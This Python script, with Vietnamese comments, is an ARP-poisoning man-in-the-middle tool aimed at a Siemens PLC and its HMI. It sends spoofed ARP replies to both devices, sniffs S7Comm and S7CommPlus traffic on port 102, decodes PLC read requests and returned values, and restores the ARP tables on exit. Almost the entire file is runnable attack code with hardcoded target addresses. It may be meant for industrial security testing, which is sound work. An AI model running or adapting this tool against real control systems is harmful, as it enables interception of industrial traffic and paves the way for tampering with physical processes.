import sys, io, os, time, struct, threading
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

HMI_IP = "192.168.210.31"
PLC_IP = "192.168.210.211"

print("""
╔══════════════════════════════════════════════════════╗
║         ARP POISON + S7CommPlus SNIFFER              ║
║  HMI (192.168.210.31) ↔ PLC (192.168.210.211)       ║
╚══════════════════════════════════════════════════════╝

Yêu cầu:
  1. Chạy với quyền Administrator
  2. pip install scapy
  3. Enable IP forwarding (tránh DoS)

Bật IP forwarding trước:
  Windows: netsh interface ipv4 set interface "Ethernet" forwarding=enabled
  Linux:   echo 1 > /proc/sys/net/ipv4/ip_forward
""")

try:
    from scapy.all import (ARP, Ether, IP, TCP, Raw,
                            sendp, sniff, get_if_hwaddr,
                            srp, conf, send)

    IFACE = "Ethernet"  # auto-detect interface
    print(f"[*] Using interface: {IFACE}")

    # ── Get MACs ─────────────────────────────────────────
    def get_mac(ip):
        ans,_ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                    timeout=2, iface=IFACE, verbose=0)
        return ans[0][1].hwsrc if ans else None

    print(f"[*] Resolving MACs...")
    hmi_mac = get_mac(HMI_IP)
    plc_mac = get_mac(PLC_IP)
    print(f"    HMI {HMI_IP} → {hmi_mac}")
    print(f"    PLC {PLC_IP} → {plc_mac}")

    if not hmi_mac or not plc_mac:
        print("[-] Cannot resolve MAC. Check network interface.")
        sys.exit(1)

    # ── ARP Poison thread ─────────────────────────────────
    poison_running = True
    def arp_poison():
        my_mac = get_if_hwaddr(IFACE)
        while poison_running:
            # Tell HMI: "I am the PLC"
            sendp(Ether(dst=hmi_mac)/ARP(
                op=2, pdst=HMI_IP, hwdst=hmi_mac,
                psrc=PLC_IP, hwsrc=my_mac),
                iface=IFACE, verbose=0)
            # Tell PLC: "I am the HMI"
            sendp(Ether(dst=plc_mac)/ARP(
                op=2, pdst=PLC_IP, hwdst=plc_mac,
                psrc=HMI_IP, hwsrc=my_mac),
                iface=IFACE, verbose=0)
            time.sleep(1)

    # ── S7CommPlus Parser ─────────────────────────────────
    packet_count = 0
    s7_packets   = []

    def parse_s7plus(raw: bytes, direction: str):
        """Parse S7CommPlus data từ TCP payload"""
        if len(raw) < 4: return

        # TPKT header
        if raw[0] != 0x03: return
        tpkt_len = struct.unpack(">H", raw[2:4])[0]

        # COTP
        if len(raw) < 7: return
        cotp_len  = raw[4]
        cotp_type = raw[5]
        if cotp_type != 0xF0: return  # Data only

        # S7 payload starts at offset 7
        s7 = raw[7:]
        if len(s7) < 2: return

        proto = s7[0]

        if proto == 0x32:  # S7Comm classic
            if len(s7) < 10: return
            rosctr   = s7[1]
            func     = s7[10] if len(s7) > 10 else 0
            rosctr_names = {1:"Job",2:"Ack",3:"Ack-Data",7:"UserData"}
            func_names   = {4:"Read",5:"Write",0xF0:"SetupComm"}
            print(f"\n  [{direction}] S7Comm | "
                  f"ROSCTR={rosctr_names.get(rosctr,hex(rosctr))} | "
                  f"Func={func_names.get(func,hex(func))}")

            # Parse Read/Write items
            if func == 0x04 and rosctr == 0x01:  # Read Job
                item_count = s7[12] if len(s7) > 12 else 0
                print(f"    Items: {item_count}")
                off = 13
                for i in range(item_count):
                    if off+12 > len(s7): break
                    area   = s7[off+5]
                    db_num = struct.unpack(">H", s7[off+6:off+8])[0]
                    start  = struct.unpack(">I",
                             b'\x00'+s7[off+9:off+12])[0] // 8
                    length = struct.unpack(">H", s7[off+3:off+5])[0]
                    areas  = {0x81:"I",0x82:"Q",0x83:"M",0x84:"DB"}
                    aname  = areas.get(area, f"0x{area:02X}")
                    if area == 0x84:
                        print(f"    → READ DB{db_num}.DBB{start} "
                              f"len={length}")
                    else:
                        print(f"    → READ {aname}{start} len={length}")
                    off += 12

            elif func == 0x04 and rosctr == 0x03:  # Read Response
                off = 12
                item_idx = 0
                while off < len(s7)-4:
                    ret  = s7[off]
                    tsz  = s7[off+1]
                    dlen = struct.unpack(">H", s7[off+2:off+4])[0]
                    if tsz in [3,4,5]: dlen = (dlen+7)//8
                    data = s7[off+4:off+4+dlen]
                    if ret == 0xFF:
                        # Try decode as floats
                        floats = []
                        for fi in range(0, len(data)-3, 4):
                            try:
                                f = struct.unpack(">f",
                                    data[fi:fi+4])[0]
                                if -1e6 < f < 1e6:
                                    floats.append(round(f,3))
                            except: pass
                        print(f"    ← DATA[{item_idx}] "
                              f"{data.hex()} "
                              f"floats={floats}")
                    off += 4 + dlen + (dlen%2)
                    item_idx += 1

        elif proto == 0x72:  # S7CommPlus
            version = s7[1]
            pkt_type= s7[4] if len(s7) > 4 else 0
            types   = {0x31:"Req",0x32:"Resp",0x33:"Notif",0x35:"ReqF"}
            print(f"\n  [{direction}] S7CommPlus v{version} | "
                  f"Type={types.get(pkt_type,hex(pkt_type))} | "
                  f"len={len(s7)}")
            if len(s7) > 10:
                print(f"    Hex: {s7[:40].hex()}")

    # ── Packet callback ───────────────────────────────────
    def pkt_callback(pkt):
        global packet_count
        if not pkt.haslayer(TCP): return
        if not pkt.haslayer(Raw): return

        src = pkt[IP].src
        dst = pkt[IP].dst
        sport= pkt[TCP].sport
        dport= pkt[TCP].dport

        # Only S7 traffic (port 102)
        if sport != 102 and dport != 102: return

        raw = bytes(pkt[Raw].load)
        if len(raw) < 4: return

        packet_count += 1
        direction = (f"HMI→PLC" if src == HMI_IP
                     else f"PLC→HMI" if src == PLC_IP
                     else f"{src}→{dst}")

        print(f"\n[#{packet_count}] {direction} | "
              f"{len(raw)} bytes | "
              f"TCP {sport}→{dport}")
        parse_s7plus(raw, direction)
        s7_packets.append((time.time(), direction, raw))

    # ── Start ─────────────────────────────────────────────
    print(f"\n[*] Starting ARP poison...")
    pt = threading.Thread(target=arp_poison, daemon=True)
    pt.start()
    print(f"[+] ARP poison running (HMI↔PLC)")

    print(f"[*] Sniffing S7CommPlus traffic on port 102...")
    print(f"    Press Ctrl+C to stop\n")

    try:
        sniff(iface=IFACE,
              filter=f"tcp port 102 and "
                     f"(host {HMI_IP} or host {PLC_IP})",
              prn=pkt_callback,
              store=0)
    except KeyboardInterrupt:
        pass

    poison_running = False
    print(f"\n[*] Captured {packet_count} S7 packets")
    print(f"[*] Restoring ARP tables...")
    # Restore ARP
    for _ in range(3):
        sendp(Ether(dst=hmi_mac)/ARP(
            op=2, pdst=HMI_IP, hwdst=hmi_mac,
            psrc=PLC_IP, hwsrc=plc_mac),
            iface=IFACE, verbose=0)
        sendp(Ether(dst=plc_mac)/ARP(
            op=2, pdst=PLC_IP, hwdst=plc_mac,
            psrc=HMI_IP, hwsrc=hmi_mac),
            iface=IFACE, verbose=0)
    print("[+] ARP restored. Done.")

except ImportError:
    print("[-] pip install scapy")
except PermissionError:
    print("[-] Cần chạy với quyền Administrator!")
except Exception as e:
    print(f"[-] {e}")
    import traceback; traceback.print_exc()
